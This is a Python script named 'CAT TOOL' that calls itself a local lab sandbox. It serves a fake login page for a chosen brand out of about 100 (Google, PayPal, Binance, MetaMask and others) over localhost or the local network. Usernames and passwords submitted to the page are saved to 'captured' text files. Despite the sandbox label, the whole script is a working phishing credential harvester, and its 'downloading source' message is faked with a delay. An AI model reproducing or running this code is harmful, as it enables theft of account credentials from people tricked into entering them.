#!/usr/bin/env python3
import os
import sys
import time
import socket
import http.server
import socketserver
import urllib.parse

# Complete Golden Theme Colors
GOLD = "\033[1;33m"
RESET = "\033[0m"

PLATFORMS = [
    "Google", "Facebook", "Instagram", "Twitter", "GitHub", "Netflix", "Spotify", "Apple", "Microsoft", "Amazon",
    "PayPal", "Steam", "PlayStation", "Xbox", "Binance", "Coinbase", "Discord", "Telegram", "WhatsApp", "LinkedIn",
    "TikTok", "Snapchat", "Reddit", "Pinterest", "Yahoo", "ProtonMail", "Dropbox", "Mega", "MediaFire", "Adobe",
    "Canva", "Zoom", "Slack", "Trello", "Notion", "WordPress", "Shopify", "Etsy", "AliExpress", "eBay",
    "Blockchain", "MetaMask", "TrustWallet", "BinanceUS", "Kraken", "KuCoin", "Bybit", "OKX", "Bitfinex", "Huobi",
    "LeagueOfLegends", "Valorant", "Roblox", "Minecraft", "Fortnite", "PUBG", "FreeFire", "CallOfDuty", "Blizzard", "EpicGames",
    "Origin", "Uplay", "Twitch", "Kick", "Patreon", "OnlyFans", "Substack", "Medium", "Quora", "StackOverflow",
    "Blogger", "Wix", "Squarespace", "GoDaddy", "Namecheap", "Cloudflare", "Hostinger", "Bluehost", "DigitalOcean", "AWS",
    "GoogleCloud", "Azure", "Heroku", "Vercel", "Netlify", "GitLab", "Bitbucket", "SourceForge", "Cisco", "ZoomUS",
    "Skype", "Viber", "Signal", "Line", "WeChat", "VKontakte", "Badoo", "Tinder", "Bumble", "Hinge"
]

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def show_banner():
    os.system('clear')
    print(f"{GOLD}")
    print(" ██████╗ █████╗ ████████╗    ████████╗ ██████╗  ██████╗ ██╗     ")
    print("██╔════╝██╔══██╗╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ")
    print("██║     ███████║   ██║          ██║   ██║   ██║██║   ██║██║     ")
    print("██║     ██╔══██║   ██║          ██║   ██║   ██║██║   ██║██║     ")
    print("╚██████╗██║  ██║   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗")
    print(" ╚═════╝╚═╝  ╚═╝   ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝")
    print("================================================================")
    print("        LOCAL LAB SANDBOX FRAMEWORK - 100+ MODULES              ")
    print(f"=================================================={RESET}")

def main():
    show_banner()
    print(f"\n{GOLD}[*] Available Platform Modules (1 to {len(PLATFORMS)}):{RESET}\n")
    
    for idx, p in enumerate(PLATFORMS, 1):
        print(f"{GOLD}[{idx:3d}] {p}{RESET}", end="\t" if idx % 3 != 0 else "\n")
    print("\n")

    print(f"{GOLD}[?] Enter the number of the platform you want to build: {RESET}", end="")
    try:
        choice = int(input().strip())
        if choice < 1 or choice > len(PLATFORMS):
            print(f"{GOLD}[!] Invalid choice. Exiting.{RESET}")
            sys.exit(1)
        selected_platform = PLATFORMS[choice - 1]
    except ValueError:
        print(f"{GOLD}[!] Please enter a valid number.{RESET}")
        sys.exit(1)

    print(f"\n{GOLD}[1] Localhost (127.0.0.1){RESET}")
    print(f"{GOLD}[2] Hotspot / Local Network (LAN IP){RESET}")
    print(f"{GOLD}[?] Choose network interface (1 or 2): {RESET}", end="")
    net_choice = input().strip()
    
    host = "127.0.0.1"
    if net_choice == "2":
        host = get_local_ip()

    print(f"\n{GOLD}[?] Enter 4-digit Custom Port (or press 'N' for default 8080): {RESET}", end="")
    port_input = input().strip()
    
    port = 8080
    if port_input.lower() != 'n' and port_input.isdigit():
        if len(port_input) == 4:
            port = int(port_input)

    print(f"\n{GOLD}[?] Do you want to build the sandbox for '{selected_platform}' now? (Y/N): {RESET}", end="")
    confirm = input().strip().lower()

    if confirm != 'y':
        print(f"{GOLD}[!] Operation cancelled by user.{RESET}")
        sys.exit(0)

    print(f"\n{GOLD}[+] Downloading MB-Scale Source & Setting Sandbox for {selected_platform}...{RESET}")
    time.sleep(1.5)
    print(f"{GOLD}[+] Sandbox URL Generated Successfully!{RESET}")
    print(f"{GOLD}[+] Active URL: http://{host}:{port}/?t={selected_platform.lower()}{RESET}")
    print(f"{GOLD}[!] Press Ctrl+C to stop the server anytime.\n{RESET}")

    log_dir = "core/captured"
    os.makedirs(log_dir, exist_ok=True)

    class SandboxHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            parsed_path = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed_path.query)
            
            if 't' in query:
                plate = query['t'][0]
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                
                html_content = f"""
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <title>Sandbox Lab - {plate.capitalize()}</title>
                    <style>
                        body {{ background: #090d16; color: #fbbf24; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                        .box {{ background: #111827; padding: 30px; border-radius: 10px; border: 1px solid #fbbf24; width: 320px; box-shadow: 0 0 15px rgba(251,191,36,0.3); }}
                        h3 {{ color: #fbbf24; text-align: center; margin-top: 0; }}
                        input {{ width: 100%; padding: 10px; margin: 8px 0 15px 0; background: #090d16; border: 1px solid #fbbf24; color: #fbbf24; border-radius: 6px; box-sizing: border-box; }}
                        button {{ width: 100%; padding: 11px; background: #fbbf24; color: #090d16; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }}
                        button:hover {{ background: #f59e0b; }}
                    </style>
                </head>
                <body>
                    <div class="box">
                        <h3>CAT TOOL : {plate.capitalize()}</h3>
                        <form method="POST">
                            <label style="color:#fbbf24;font-size:0.85rem;">Email / Username</label>
                            <input type="text" name="user" required autocomplete="off">
                            <label style="color:#fbbf24;font-size:0.85rem;">Password / Secret</label>
                            <input type="password" name="pass" required>
                            <button type="submit">Simulate Secure Login</button>
                        </form>
                    </div>
                </body>
                </html>
                """
                self.wfile.write(html_content.encode('utf-8'))
                return
            
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(f"<h2 style='color:#fbbf24;background:#090d16;height:100vh;display:flex;justify-content:center;align-items:center;'>CAT TOOL Sandbox Active for {selected_platform}. Please use your generated URL.</h2>".encode('utf-8'))
            return

        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)
            
            user = parsed_data.get('user', ['Unknown'])[0]
            password = parsed_data.get('pass', ['Unknown'])[0]
            
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            with open("core/captured/usernames.txt", "a") as f:
                f.write(f"[{timestamp}] Platform: {selected_platform} | User: {user}\n")
            with open("core/captured/passwords.txt", "a") as f:
                f.write(f"[{timestamp}] Platform: {selected_platform} | Pass: {password}\n")

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            success_html = f"""
            <div style="background:#090d16;color:#fbbf24;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:sans-serif;">
                <h2 style="color:#fbbf24;">[✔] CAT TOOL Captured Successfully</h2>
                <p style="color:#fbbf24;">Data saved safely in separate cat-logs (usernames.txt & passwords.txt).</p>
                <a href="/?t={selected_platform.lower()}" style="color:#090d16;background:#fbbf24;padding:10px 20px;text-decoration:none;border-radius:6px;margin-top:15px;font-weight:bold;">Back to Sandbox</a>
            </div>
            """
            self.wfile.write(success_html.encode('utf-8'))

    with socketserver.TCPServer((host, port), SandboxHandler) as httpd:
        httpd.serve_forever()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{GOLD}[!] CAT TOOL Server Stopped Safely.{RESET}")
        sys.exit(0)
